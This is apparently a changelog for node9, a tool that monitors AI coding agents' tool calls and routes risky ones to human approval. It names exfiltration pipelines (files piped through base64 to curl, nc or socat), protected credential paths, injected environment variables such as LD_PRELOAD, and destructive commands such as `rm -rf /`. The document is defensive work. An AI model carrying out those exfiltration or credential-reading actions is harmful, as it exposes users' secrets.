- **One approval timer.** The approval timeout of the project's config is the card's own deadline; `node9 tail` shows when a card will be denied ("Auto-denies in 2m 5s"), or that it waits with no timeout. An answer that came too late says what decided the card first.
- **Closing `node9 tail` denies only approvals nothing else can answer.** Approvals that Slack, Mission Control or the desktop popup can still answer keep waiting.
- **A review in `node9 tail` can wait longer than 5 minutes.** The hook waited for the daemon's answer with `fetch`, which ends a request with no response after 300 s, so with `approvalTimeoutMs: 0` ("no timer") or a timeout of 5 minutes or more the card vanished from `node9 tail` at 300 s and the call was denied as "All approval channels failed". The wait now has no limit of its own: it ends when the daemon answers, at the configured timeout, or when another channel decides.
- **A deny no person made is no longer reported as a human rejection** (node9Firewall#304). When the daemon's auto-deny timer, its own background check, or a failed wait ended an approval, the agent was told "The human user rejected this action via the Node9 Terminal" and the audit row said "User denied". The agent now gets the rule's own verdict (for a softened block, the block's message: a protected file is reported as protected), the daemon marks its timer's deny with `source: "timeout"`, and the row records a timeout or a rule. Whether a person decided is no longer read from words in the label, so a rule named, say, `review-user-data` cannot turn a block into a human rejection.
- **An administrator's decision relayed by the daemon is the organisation's** (review of node9Firewall#304). When the daemon's background check resolved a card (its cloud racer: an administrator in Slack or Mission Control, or a rule), `/wait` carried no source, so a person's deny there was credited to a local rule and a cloud allow to a click in `node9 tail`. The daemon now names the decider (`cloud`, `policy`, `timeout`); the hook reports a cloud decision as "Organization Policy (SaaS)", as its own cloud racer does, and a wait that failed as "Approval Unavailable" instead of naming a rule that did not decide. The daemon routes and the hook read one list of human channels.
- **The approval card for a softened local block names its rule and asks** (node9Firewall#305). On a cloud-connected machine, a project-jail block softened to a review showed "Organization Policy (SaaS)" as the card's header; a local rule's label is now kept. The builtin shield sentence on the card reads as a request ("Reading .env files needs your approval (project-jail shield)") instead of "is blocked" above an Allow button; the agent still reads the block wording.
- **No emoji in the block text the agent reads** (node9Firewall#306). The generic block message named labels such as the egress protected-address label with their emoji and "Node9"; the agent now reads "node9 Egress (Protected Address)". The labels the dashboard, the catalog and the terminal read are unchanged.

- **Decimal numbers are no longer blocked as credit cards** (node9Firewall#333). A float printed at full precision has 16 or 17 digits after `0.`, and the card detector read that fractional part as a card number; when it passed Luhn, the realtime PII gate denied the tool call (1.4% of simple fractions, for example a rate written to a JSON report). An unseparated card-shaped run directly after a digit and a dot is no longer a match; a grouped card there still is. A real card anywhere else, including inside JSON, is still blocked. `CANONICAL_EXTRACTOR_VERSION` is now `canonical-v24`, so scanned histories are read again.

- **Personal data masking covers line starts and decimal-looking cards.** A card number or IBAN that begins a line inside a multi-line argument (a CSV being written) was left unmasked in audit rows and cloud arguments; string arguments are now masked as raw text before their JSON form. Masking no longer applies the card detector's decimal-fraction exemption, so a card written after `1.` or `0,` is masked too; a Luhn-valid fractional part inside text is masked in the log as well, while a number argument stays a number. Two keys that mask to the same text keep both entries (`#2` suffix).

- **Comma decimals and leading-dot decimals are no longer blocked as credit cards** (follow-up to node9Firewall#333). The same false positive appeared when a fraction was written as `0,479...` (comma decimal, European CSV) or `.479...` (no leading zero, as `bc` prints it): 8,886 of the 499,500 fractions k/n with n <= 1000 were flagged in each spelling, now 0. A comma after any digit other than a standalone `0` is still read as a possible card, so a card in a CSV row such as `1,<card>` stays blocked; a comma decimal above 1 is an accepted gap. `CANONICAL_EXTRACTOR_VERSION` is now `canonical-v27`.

- **`chmod 777` shield false-positive on string literals (AST-aware fix).** The filesystem shield matched `chmod 777` as a raw substring, so it fired on a `node -e` / `python -c` payload that merely _mentioned_ `chmod 777` inside a regex/string literal (a detection pattern, not a run command). New `analyzeChmod777` only fires when `chmod` is a real command name (a `CallExpr` first-word in the mvdan-sh AST) **and** an open-permission token is present; the raw-regex smart rule `shield:filesystem:review-chmod-777` is suppressed for bash via `AST_FS_REGEX_RULES`. Pinned by a test using the exact `node -e` payload that misfired. Same class as the earlier AST-aware SQL-destructive fix — keyword-in-a-string is never a real action.

- **PostToolUse audit rows misattributed to "Claude Code" when shim-tagged.** `src/cli/commands/log.ts` reimplemented a subset of `detectAiAgent` and skipped its Layer-0 `meta.agent` check entirely — meaning any payload from a node9-authored shim (Pi, Opencode) carrying `hook_event_name: "PostToolUse"` was misattributed to Claude Code in `~/.node9/audit.log`, even when the shim correctly tagged `meta.agent: "Pi"` / `"Opencode"`. The block decisions on PreToolUse and UserPromptSubmit were correct (those go through `check.ts` which honors Layer 0); only the `node9 log` fire-and-forget audit path was wrong. Added the Layer-0 check ahead of the existing fingerprint chain in `log.ts`, exactly mirroring `check.ts:48-60`. Surfaces dashboards' per-agent block-rate metrics correctly for shim-wired agents. Found during Pi integration live verify; defensive empty-string / non-string `meta.agent` falls through to the existing fingerprint chain.

- **Activity-socket rebind loop.** The flight-recorder Unix socket's self-heal used `fs.watch` on `tmpdir()`, which fired inotify events for the daemon's own unlink-then-listen sequence. The watcher would observe the file gone (between unlink and listen completing), trigger another rebind, fire another inotify event, and so on — quickly hitting `EADDRINUSE` and tripping the circuit breaker, leaving the flight recorder down with the warning _"Activity socket repeatedly disappearing — run: node9 daemon restart"_ until manual intervention. Replaced with a 2 s `setInterval` polling probe that cannot self-trigger. Detection latency on real socket loss goes from ~instant to ≤ 2 s. Adds a regression test asserting zero rebind log lines during quiet operation.

---

## v1.19.3 — macOS daemon-detection hotfix

### Fixed

- **`node9 doctor` reported the daemon as not running on macOS even when it was running** (issue #162). `isDaemonRunning()` shelled out to `ss` (Linux iproute2) to verify the TCP port was bound. On macOS `ss` does not exist, so `spawnSync` returned `ENOENT` and the function always returned `false` — even when the daemon process was up and the PID file was valid. This caused `node9 daemon status` (PID-file based) and `node9 doctor` (port-probe based) to disagree on macOS, and made browser/native approvals appear unavailable.

  Fix: drop the TCP probe from the sync hot path. `isDaemonRunning()` now relies on PID-file validity + `process.kill(pid, 0)` — cross-platform and faster (no per-hook `spawnSync`). Callers needing strict HTTP-liveness should use the new `isDaemonReachable()` async helper. The orphan-adoption path in `daemon/server.ts` (rare, fires on `EADDRINUSE` without a PID file) keeps a port probe but now falls back from `ss` to `lsof` on macOS.

  Adds a regression test asserting `isDaemonRunning()` does not invoke `spawnSync` — guards against re-introducing a Linux-only binary dependency.

- **Misleading "browser dashboard" messages.** `node9 doctor` claimed _"Browser dashboard running → http://127.0.0.1:7391/"_ and the daemon banner printed _"🛡️ Node9 Guard LIVE: http://127.0.0.1:7391"_ — but the local browser dashboard was retired in the v3 browser-removal sprint and `GET /` now 404s. Updated both messages to describe what actually exists (terminal & native approvals; SSE/JSON-RPC for `node9 tail` and the MCP gateway).

- **`undo` legacy-fallback inherited `GIT_DIR` from caller env.** `buildGitEnv()`'s shadow-absent path returned `{ ...process.env }` without stripping `GIT_DIR` / `GIT_WORK_TREE`. If those happened to be set in the caller's environment (e.g. running under `git commit` inside a git worktree), the legacy fallback would inherit a worktree pointer it shouldn't use. Now explicitly deletes both before returning.

---

## v1.10.0 — Installed Skill Pinning (AST 02 + AST 07)

### Added

- **Installed Skill Pinning:** Per-plugin drift detection for marketplace-installed plugins at `~/.claude/plugins/marketplaces/<registry>/plugins/<name>/`. Each plugin gets its own pin (same model as MCP server pinning) — installing a new plugin creates a new pin silently, only changes to an already-pinned plugin trigger drift. Off by default (`policy.skillPinning.enabled: false`). Two modes:
  - **`mode: 'warn'` (default)** — `/dev/tty` notification on drift, tool call allowed (exit 0)
  - **`mode: 'block'`** — quarantine the session until the user reviews

  **Intentionally narrow default scope:** user-edited files (`CLAUDE.md`, `.cursor/rules/`, `AGENTS.md`) are **not** in the default set. Those change constantly in normal workflow, and if they're in a git repo `git status`/`git diff` is the better tool. Users who want to pin additional paths can add them via `policy.skillPinning.roots`.

  Covers **AST 02 Supply Chain Compromise** and **AST 07 Update Drift** at the installed-skill layer. Per-session memoisation in `~/.node9/skill-sessions/` so hashing runs once per session.

- **`node9 skill pin` CLI** — `list` / `update <rootKey>` / `reset`, mirroring `node9 mcp pin`.

- **`policy.skillPinning` config** — `{ enabled, mode, roots }`. `roots` extends the default (`~/.claude/skills/`) with user-specified paths.

### Security properties

- Fail-closed on corrupt `skill-pins.json` (recovery: `node9 skill pin reset`)
- Symlink-safe; size-bounded (5000 files / 50 MB per root)
- Path-traversal-safe session IDs (`[A-Za-z0-9_-]{1,128}`)
- Atomic writes, mode 0o600

---

## v1.7.0 — Steerable Redirect Recovery Menu

### Added

- **Recovery Menu in `node9 tail`:** When a stateful block rule fires with a `recoveryCommand`, the tail approver now renders an interactive STATE GUARD card instead of a plain approval card. Options:
  - **[1] Allow anyway** — override the policy for this call
  - **[2] Redirect AI** — sends a structured reason back to Claude: _"Run `<recoveryCommand>` first, then retry your original command."_ This steers the AI to fix the root cause rather than retrying blindly.
  - **[3] Deny & stop** — hard block; auto-deny on timeout

- **`terminal-redirect` decision source:** When the developer selects [2], the tail posts `{ decision: 'deny', reason: "...", source: 'terminal-redirect' }` to the daemon. The orchestrator recognises this source and uses the redirect reason as the block message sent back to the AI agent instead of the generic "user rejected" message.

- **Fail-open on daemon unreachable is intentional:** When the daemon cannot be reached, stateful block predicates are treated as unknown and the rule is downgraded to review. This is a deliberate trade-off — availability over lockout. A future `failMode: 'open' | 'closed'` field on smart rules is planned to make this configurable per-rule.

---

## v1.6.0 — Stateful Smart Rules

### Added

- **Stateful Smart Rules (`dependsOnState`):** Smart rules can now condition a `block` verdict on real session state instead of firing unconditionally. Add a `dependsOnState` array to any block rule with one or more named predicates — the block only fires if **all** predicates are satisfied at evaluation time. If any predicate is false, or the daemon is unreachable, the rule is silently downgraded to a review (fail-open). Currently supported predicate:
  - `no_test_passed_since_last_edit` — true when a file was edited since the last passing test run.

  ```json
  {
    "name": "require-tests-before-deploy",
    "tool": "Bash",
    "conditions": [{ "field": "command", "op": "matches", "value": "./deploy.sh" }],
    "verdict": "block",
    "reason": "Run tests before deploying",
    "dependsOnState": ["no_test_passed_since_last_edit"],
    "recoveryCommand": "npm test"
  }
  ```

- **`recoveryCommand` on Smart Rules:** Block rules now accept an optional `recoveryCommand` string. When the rule fires, the command is shown to the developer on `/dev/tty` as `💡 Run: npm test` and sent to the AI as a negotiation hint: _"Run `npm test` first, then retry your original command."_ Works on both stateful and plain block rules.

- **Session History tracking (daemon-side):** The daemon now tracks `lastEditAt`, `lastTestPassAt`, and `lastTestFailAt` timestamps across the session lifetime. File edits are detected from the `allow` activity events for write tools (`Edit`, `Write`, `MultiEdit`, etc.). Test results are detected from the PostToolUse `log` hook — the hook reads `tool_response.output` and classifies the run as `pass` or `fail` based on output patterns from common test runners (`vitest`, `jest`, `pytest`, `cargo test`, `go test`, `rspec`, and more).

- **`/state/check` HTTP endpoint on daemon:** `GET /state/check?predicates=no_test_passed_since_last_edit` returns a JSON map `{ "no_test_passed_since_last_edit": true }`. Called by the orchestrator before applying a stateful block; result is cached-by-call (100 ms timeout, fail-open on error).

- **HUD line 3 — Environment counts:** The status line now renders a third line showing the active Claude Code environment configuration:
  ```
  1 CLAUDE.md  |  4 rules  |  3 MCPs  |  2 hooks
  ```
  Counts are read from `~/.claude/settings.json`, `~/.claude.json`, `.mcp.json`, and `.claude/rules/` — mirroring the same sources as the claude-hud project. The line is omitted entirely when all counts are zero. The `cwd` field from Claude Code's stdin JSON is used to scope project-level counts.

---

## v1.4.0

### Added

- **Insight Line — "Always Allow" nudge:** After approving the same tool 3+ times, every approval channel (terminal, browser dashboard, native popup) now shows a 💡 hint: _"Approved N× before — 'Always Allow' creates a permanent rule."_ The counter is tracked daemon-side per tool (`insightCounts` Map) and is never reset by the suggestion threshold — only on deny. This ensures the nudge appears consistently across all channels and sessions.

- **Smart Rule Suggestions:** After 3 consecutive approvals of the same tool, the daemon generates a suggested smart rule (e.g. `allowGlob` for file reads, `allowCommand` for shell commands). The suggestion appears in the browser dashboard with a one-click "Apply Rule" button that patches your config without a restart. Suggestions are cleared on deny or config change.

- **Terminal card stamping:** Approved or denied terminal cards now stay visible in `node9 tail` history with the decision stamped on them (`✓ ALLOWED (terminal)` / `✗ DENIED (terminal)`). Previously the card was erased from the terminal buffer on resolution, leaving no trace of what was decided.

- **`node9 status` — Agent Wiring Report:** `node9 status` now includes an **Agent Wiring** section showing, per detected agent (Claude Code, Gemini CLI, Cursor): which hooks are wired (`PreToolUse`, `PostToolUse`, `BeforeTool`, `AfterTool`) and which MCP servers are currently proxied through node9. Example output:

  ```
  Agent Wiring:

  Claude Code
    ✓ PreToolUse  (node9 check)
    ✓ PostToolUse (node9 log)
    MCP proxied: none

  Gemini CLI
    ✓ BeforeTool  (node9 check)
    ✓ AfterTool   (node9 log)
    MCP proxied:
      • postgres → npx -y @modelcontextprotocol/server-postgres postgresql://...
  ```

- **Trusted-Host Allowlist (`node9 trust add/remove/list`):** Persistent per-user allowlist of known-safe network destinations. Pipe-chain exfiltration decisions are downgraded for trusted hosts only: `critical` (hard block) → `review` (approval prompt), `high` (review) → `allow`. If any sink in the pipeline is untrusted, the original decision stands. Hosts are stored in `~/.node9/trusted-hosts.json` (`0o600`) with atomic write (tmp + rename). Only the CLI can add entries — no MCP tool or API can modify the list. Supports exact FQDNs (`api.mycompany.com`) and wildcard subdomains (`*.mycompany.com`); wildcards match any subdomain at any depth (`api.mycompany.com`, `us.api.mycompany.com`, etc.) but do **not** match the bare domain (`mycompany.com`). Single-label wildcards (`*.com`, `*.io`) are rejected at add-time as too broad.
- **`node9 trust add <host>`:** Adds a host to the trusted list. Normalizes input (strips protocol, path, port, `user@`) before storing so `https://api.company.com/v1/ingest` and `api.company.com` are treated as the same entry. No-op if already present.
- **`node9 trust remove <host>`:** Removes a host from the trusted list. Exits non-zero if not found.
- **`node9 trust list`:** Displays all trusted hosts with the date they were added.
- **TTL cache for trusted-host lookups:** `isTrustedHost()` is on the hot path (called for every pipe-chain tool call). Results are cached in-process (5-second TTL) to avoid a synchronous disk read on every policy evaluation. Cache is invalidated on every write by the same process. For cross-process invalidation (e.g. `node9 trust remove` run in a CLI while the daemon is running), the cache stores the file mtime and re-reads immediately on the next call if the mtime has changed — removal takes effect on the next policy evaluation, not after the full TTL.

### Fixed

- **Browser opened twice on `node9 tail` launch:** The daemon no longer reopens the browser tab on the first `/check` request when `node9 tail` has already opened one. `tail` posts `POST /browser-opened` after launching the browser so the daemon can skip the duplicate open.

---

## v1.3.0

### Added

- **Pipe-Chain Exfiltration Detection:** The policy engine now detects shell pipelines that exfiltrate sensitive files to the network. Two risk levels: `critical` (file piped through an obfuscator such as `base64`, `xxd`, `gzip`, `openssl` before a network sink) → hard block; `high` (file piped directly to a network sink like `curl`, `wget`, `nc`, `socat`) → review. Sink targets (URLs, hostnames, IPs) are extracted from the pipeline and surfaced in the block reason and audit log.
- **Binary Provenance Check:** Absolute-path binaries (e.g. `/tmp/curl`) are classified by filesystem location before execution. Binaries in temp directories, world-writable paths, or unknown locations are flagged as `suspect` (block in strict mode, review in standard) or `unknown` (review in strict mode). System binaries (`/usr/bin`, `/bin`, `/usr/local/bin`) and managed tool binaries (nvm, volta, homebrew, pyenv, cargo) are trusted. Bare command names (`npm`, `curl`) are not checked to avoid false positives from PATH-managed tools.
- **`_classifyPath()` exported pure helper:** Extracted from `checkProvenance()` for unit testability without filesystem mocking. Takes a resolved path and optional cwd, returns `{ trustLevel, reason }`.
- **SSH multi-hop host extraction:** `extractAllSshHosts()` parses `ssh`/`scp`/`rsync` command arguments including `-J` jump hosts, `ProxyJump` config, and `user@host` patterns. Extracted hostnames are added to the token stream for dangerous-word scanning.

### Fixed

- **POSIX path semantics on Windows:** All prefix checks in provenance now use `'/'` as separator instead of `path.sep` (which is `'\\'` on Windows). `path.posix.isAbsolute` replaces `path.isAbsolute` for checking POSIX-style paths. This fixes all provenance classification tests on `windows-latest` CI.

---

## v1.2.0

### Added

- **MCP Gateway (`node9 mcp-gateway`):** Universal stdio proxy that sits between any MCP client (Claude, Cursor, Windsurf) and any upstream MCP server. Every `tools/call` passes through the full Node9 authorization engine — DLP scanner, smart rules, and human approval — before reaching the upstream. Blocked calls receive a structured JSON-RPC `-32000` error with an AI-readable explanation so the agent can reason about the block and try an alternative. Approved calls are forwarded unchanged; the gateway is transparent to both client and server. Configure in `.mcp.json`:

  ```json
  {
    "mcpServers": {
      "filesystem-node9": {
        "command": "node9",
        "args": [
          "mcp-gateway",
          "--upstream",
          "npx @modelcontextprotocol/server-filesystem /home/user"
        ]
      }
    }
  }
  ```

  Key security properties:
  - **Fail-closed:** auth engine error → deny, never pass-through
  - **Env injection stripping:** `NODE_OPTIONS`, `LD_PRELOAD`, `PYTHONPATH`, `PERL5LIB`, `RUBYLIB`, `JAVA_TOOL_OPTIONS`, `XDG_CONFIG_HOME`, and 7 more injection vectors are stripped from the upstream subprocess environment
  - **Shell-free tokenizer:** `"node /path with spaces/server.js"` is split correctly without ever spawning a shell
  - **MCP server namespacing:** `mcp__filesystem__write_file` → server name extracted and passed to the auth engine for per-server smart rules
  - **id=0 valid, object/array ids rejected** with `-32600 Invalid Request`
  - **Race condition guards:** `deferredStdinEnd` / `deferredExitCode` ensure responses are always flushed before process exit, even when the AI client disconnects mid-authorization

- **Flight Recorder — Browser Dashboard:** The browser dashboard (`localhost:7391`) is now a true fixed-viewport 3-column layout. The left column streams every tool call in real-time — appearing immediately as `● PENDING` and resolving to `✓ ALLOW`, `✗ BLOCK`, or `🛡️ DLP` as decisions arrive. The feed scrolls internally and never causes the browser page to scroll. History from the current session is replayed to new browser tabs via an in-memory ring buffer (last 100 events).
- **`node9 tail` — Terminal Flight Recorder:** New command that streams live agent activity directly to the terminal. Uses a spec-compliant SSE parser (handles TCP fragmentation), filters history floods on connect, and shows a live `● …` pending indicator for slow operations (bash, SQL, agent calls). Auto-starts the daemon if it isn't running. Supports `--history` to replay recent events on connect. Output is pipeable (`node9 tail | grep DLP`).
- **Shields Panel in Browser Dashboard:** The right sidebar now shows all available shields (postgres, github, aws, filesystem) with live enable/disable toggles. Changes take effect immediately on the next tool call — no daemon restart required. Toggle state is broadcast via SSE to keep multiple open tabs in sync.
- **Improved Pending Approval Cards:** Approval cards now show an `⚠️ Action Required` header with a live countdown timer that turns red under 15 seconds. Allow/Deny buttons have clearer labels (`✅ Allow this Action` / `🚫 Block this Action`). The deny button uses a softer outlined style to reduce accidental clicks.
- **DLP Content Scanner:** Node9 now scans every tool call argument for secrets before policy evaluation. Seven built-in patterns cover AWS Access Key IDs, GitHub tokens (`ghp_`, `gho_`, `ghs_`), Slack bot tokens (`xoxb-`), OpenAI API keys, Stripe secret keys, PEM private keys, and Bearer tokens. `block`-severity patterns hard-deny the call immediately; `review`-severity patterns route through the normal race engine. Secrets are redacted to a prefix+suffix sample in all audit logs. Configurable via `policy.dlp.enabled` and `policy.dlp.scanIgnoredTools`.
- **Shield Templates:** `node9 shield enable <service>` installs a curated rule set for a specific infrastructure service. Available shields: `postgres` (blocks `DROP TABLE`, `TRUNCATE`, `DROP COLUMN`; reviews `GRANT`/`REVOKE`), `github` (blocks `gh repo delete`; reviews remote branch deletion), `aws` (blocks S3 bucket deletion, EC2 termination; reviews IAM and RDS changes), `filesystem` (reviews `chmod 777` and writes to `/etc/`). Manage with `node9 shield enable|disable|list|status`.
- **Shadow Git Snapshots (Phase 2 — Implemented):** Node9 now takes automatic, lightweight git snapshots before every AI file edit using an isolated shadow bare repo at `~/.node9/snapshots/<hash16>/`. The user's `.git` is never touched — snapshots live in a separate hidden repository keyed by a SHA-256 hash of the project path. Run `node9 undo` to revert with a full diff preview; `--steps N` goes back multiple actions. Per-invocation `GIT_INDEX_FILE` prevents concurrent-session corruption. A `project-path.txt` sentinel inside each shadow repo detects hash collisions and directory renames and auto-recovers by reinitializing. `.git` and `.node9` directories are always excluded from snapshots (inception prevention). Performance-tuned with `core.untrackedCache` and `core.fsmonitor`. Periodic background `git gc --auto` keeps shadow repos tidy. The last 10 snapshots are tracked in `~/.node9/snapshots.json`.
- **ReDoS Protection + LRU Regex Cache:** The policy engine now validates all user-supplied regex patterns before compilation. Patterns with nested quantifiers, quantified alternations, or quantified backreferences are rejected as ReDoS vectors. A bounded LRU cache (max 500 entries) stores compiled `RegExp` objects so repeated rule evaluations never recompile the same pattern. The `notMatches` condition is now fail-closed: if the regex is invalid, the condition fails rather than silently passing.
- **Expanded DLP Patterns:** Two new `block`-severity content patterns added to the scanner: GCP service account JSON keys (detected via the `type` field unique to service account files) and NPM registry auth tokens (detected in `.npmrc` format). Total built-in patterns: 9.
- **Sensitive File Path Blocking:** The DLP engine now intercepts tool calls targeting credential files before their content is ever read. Twenty path patterns cover SSH keys, AWS credentials, GCP config, Azure credentials, kubeconfig, dotenv files, PEM/key/p12/pfx certificate files, system auth files, and common credential JSON files. Symlinks are resolved via `fs.realpathSync.native()` before matching to prevent symlink escape attacks where a safe-looking path points to a protected file.
- **`flightRecorder` setting:** New `settings.flightRecorder` flag (default `true`) controls whether the daemon records tool call activity to the flight recorder ring buffer. Can be set to `false` to disable activity recording when the browser dashboard is not in use.

### Changed

- **`node9 tail --clear` no longer streams after clearing** ⚠️ **Breaking:** Previously `--clear` wiped the ring buffer and then continued tailing live events — visually identical to plain `node9 tail`. It now clears the buffer and exits immediately. To start fresh and watch, chain the commands: `node9 tail --clear && node9 tail --history`. Scripts relying on the old streaming-after-clear behaviour must be updated.
- **Default mode is now `audit`:** Fresh installs now default to `mode: "audit"` instead of `mode: "standard"`. In audit mode every tool call is approved and logged, with a desktop notification for anything that _would_ have been blocked. This lets teams observe agent behaviour before committing to a blocking policy. Switch to `mode: "standard"` or `mode: "strict"` when you are ready to enforce.
- **Approval timeout default is now 30 seconds:** `approvalTimeoutMs` defaults to `30000` (was `0` / wait forever). Pending approval prompts now auto-deny after 30 seconds if no human responds, preventing agents from stalling indefinitely.
- **Cloud approver disabled by default:** `approvers.cloud` defaults to `false`. Cloud (Slack/SaaS) approval must be explicitly opted in via `settings.approvers.cloud: true` after running `node9 login`.
- **Hook debug logging enabled by default:** `enableHookLogDebug` defaults to `true`. Hook invocations are written to `~/.node9/hook-debug.log` on startup to aid troubleshooting. Set to `false` to suppress.
- **Config schema version field:** The generated default config now includes `"version": "1.0"` for forward-compatibility with future migration tooling.

### Fixed

- **Cursor hook setup:** `node9 addto cursor` no longer attempts to write an unsupported `hooks.json` file. A clear warning is shown explaining that MCP proxy wrapping is the only supported protection mode for Cursor.
- **Empty shields file warning:** Suppressed a spurious parse warning that appeared on first run when `~/.node9/shields.json` existed but was empty.
- **`node9 tail` crash on daemon disconnect:** An unhandled `ECONNRESET` error on the readline interface no longer crashes the process — it exits cleanly with `❌ Daemon disconnected.`
- **Orphaned daemon detection:** `node9 tail --history` and other commands that auto-start the daemon now correctly detect a running daemon even when its PID file is missing (e.g. after the file was accidentally deleted or a previous startup wrote and then cleaned it up). All three detection paths are fixed: `isDaemonRunning()` falls back to a live `ss` port check; `ensureDaemon()` in `tail` does an HTTP health probe before spawning a new process; and the EADDRINUSE handler recovers the orphaned daemon's PID via `ss` and writes the missing PID file before exiting cleanly.
- **`node9 daemon status` reports orphaned daemons:** Previously `node9 daemon status` always reported "not running" when the PID file was absent, even if the daemon was listening on port 7391. It now reports `running (no PID file — orphaned)` in that case.

---

## [0.3.0] - 2026-03-06

### Added

- **Multi-Channel Race Engine:** Node9 now fires all enabled approval channels simultaneously (Native Popup, Browser UI, Cloud/Slack, and Terminal). The first channel to receive a human signature wins and instantly cancels all other pending racers.
- **AI Negotiation Loop:** Replaced generic "Access Denied" errors with instructional feedback prompts. When blocked, Node9 injects a structured message into the LLM's context window, teaching the agent to apologize, explain its reasoning, or pivot to a safer alternative.
- **Native OS Dialogs:** Integrated sub-second, keyboard-navigable approval dialogs via `osascript` (macOS), `zenity` (Linux), and `PowerShell` (Windows).
- **Resolution Waterfall:** Implemented a strict 5-tier configuration precedence engine: `Environment Variables` > `Cloud (SaaS)` > `Project Config` > `Global Config` > `Defaults`.
- **Identity-Aware Execution:** The policy engine now distinguishes between a Human (`Terminal`) and an AI Agent (`Claude/Gemini`). Manual shell commands now benefit from "Nuclear-only" protection, while AI agents remain under "Zero Trust" restrictions.
- **Extended Hook Timeouts:** Default hook timeouts for Claude and Gemini have been increased to 10 minutes to support asynchronous Slack and remote approvals.
- **Sandbox Paths:** Added `policy.sandboxPaths` support. Any command operating strictly within defined safe zones (e.g., `/tmp/**`) is automatically allowed without human intervention.
- **Atomic File Writes:** Implemented `atomicWriteSync` for all state files (`decisions.json`, `trust.json`, `PAUSED`). This prevents JSON corruption during concurrent AI tool calls.

### Fixed

- **True Proxy Interception:** Rewrote the Proxy/MCP runner to intercept the Agent's `stdin` (requests) rather than just monitoring the Server's `stdout` (responses). Dangerous actions are now caught _before_ they reach the target server.
- **Port Conflict Resurrection:** The daemon now detects zombie PID files and `EADDRINUSE` errors, automatically clearing dead processes and resurrecting the server.
- **Credential Separation:** API keys are now strictly isolated in `~/.node9/credentials.json` and are never read from project-level config files to prevent accidental leakage to version control.

### Security

- **Waterfall Governance:** Cloud-level "Organization Policies" now act as a Master Lock, disabling local "Allow" buttons in the Native and Browser UIs when a remote manager signature is required.
- **Graceful Idle Timeout:** The background daemon now implements a 12-hour inactivity timer to automatically shut down and free system resources after use.

---

## [0.2.0] - 2026-03-01

### Added

- **Local Approval Daemon:** `node9 daemon` starts a browser-based approval UI at `http://127.0.0.1:7391`. Approve, deny, or set persistent per-tool decisions ("Always Allow" / "Always Deny") without a Slack account.
- **Persistent Decisions Panel:** The daemon browser UI shows a `📋 Persistent Decisions` panel listing every "Always Allow" / "Always Deny" decision with a **Revoke** button. Revoking a decision removes it from `~/.node9/decisions.json` and updates all open tabs instantly via SSE.
- **`GET /decisions` endpoint:** Returns the current persistent decisions map (read-only, no CSRF required).
- **`DELETE /decisions/:toolName` endpoint:** Removes a persistent decision (requires `X-Node9-Token` CSRF header).
- **Auto-start Daemon:** When a dangerous call arrives and no approval mechanism is running, Node9 automatically starts the daemon and opens the browser — no manual setup required.
- **Browser-Close Fallback:** If the browser tab is closed mid-approval, Node9 waits 2 seconds (to allow for an accidental refresh), then abandons the request and falls back to a terminal Y/N prompt, then blocks if there is no TTY. The daemon shuts down cleanly after abandonment.
- **`autoStartDaemon` Setting:** Toggle daemon auto-start from the browser UI (⚙️ Settings) or via `settings.autoStartDaemon: false` in `~/.node9/config.json`. When disabled, dangerous commands fall back directly to a terminal prompt.
- **Smart Runner — Browser-First Flow:** `node9 "rm -rf ./data"` now prefers the browser popup over a plain terminal prompt. Terminal Y/N is only shown if the daemon fails to start. This makes the full approval UI available without pre-running `node9 daemon`.
- **Terminal Prompt Timeout:** The interactive Y/N approval prompt now auto-denies after 30 seconds if no response is given, preventing agents from hanging indefinitely when a human walks away.
- **Smart Runner:** Node9 intercepts the initial command you pass to it (e.g., `node9 "rm -rf /"`) and checks it against your security policy before execution.
- **Improved Gemini CLI Integration:** Fully supports the latest Gemini CLI hook schema (array-based `BeforeTool`/`AfterTool`).
- **Verbose Policy Debugging:** Added `~/.node9/hook-debug.log` to help troubleshoot hook payloads (`NODE9_DEBUG=1`).
- **`getGlobalSettings()` API:** Reads machine-level settings from `~/.node9/config.json` independently of project config, so daemon lifecycle preferences are never overridden by a project's policy file.

### Fixed

- **Case-Insensitive Tool Matching:** Tool names like `Shell`, `shell`, and `run_shell_command` are now correctly identified and intercepted regardless of casing.
- **Robust Hook Setup:** `node9 addto gemini` now automatically detects and fixes outdated object-based hook configurations in `settings.json`.
- **Duplicate Interception:** Fixed a bug where `run_shell_command` was in the default `ignoredTools` list, preventing it from being properly inspected. Also corrected the example `node9.config.json`.
- **`node9 check` stdin Hang:** The hook no longer hangs if the AI agent opens stdin but never sends EOF. A 5-second safety timeout ensures the process exits cleanly.
- **Smart Runner Terminal Prompt:** `allowTerminalFallback` was not being passed in the smart runner path, so the Y/N prompt never appeared. Now correctly shown when no daemon is running and a TTY is available.

### Security

- **CSRF Token on Daemon:** A per-run UUID token is embedded in the browser UI and required as `X-Node9-Token` on all state-changing requests (`POST /decision`, `POST /settings`). Prevents other local processes from silently approving pending actions.
- **Credentials File Permissions:** `~/.node9/credentials.json` is now written with `0o600` (owner read/write only).
- **Daemon Error Logging:** Handler errors in `/check`, `/decision`, and `/settings` are now logged to stderr when `NODE9_DEBUG=1`, making production debugging possible without exposing errors by default.

### Changed

- `node9 addto` now supports the new array-based hook structure for Gemini CLI.
- Updated internal `GeminiSettings` interfaces to match the latest CLI specifications.

---

## [0.1.0] - 2026-02-01

### Added

- Initial release
- `node9 proxy` — MCP JSON-RPC interceptor (wraps any MCP server or shell command)
- `node9 login` — saves API key to `~/.node9/credentials.json` for Slack routing
- `node9.config.json` — project-level policy configuration (`standard` / `strict` modes, `dangerousWords`, `ignoredTools`)
- Local terminal HITL approval via `@inquirer/prompts`
- Slack remote approval via Node9 Cloud API (Pro)
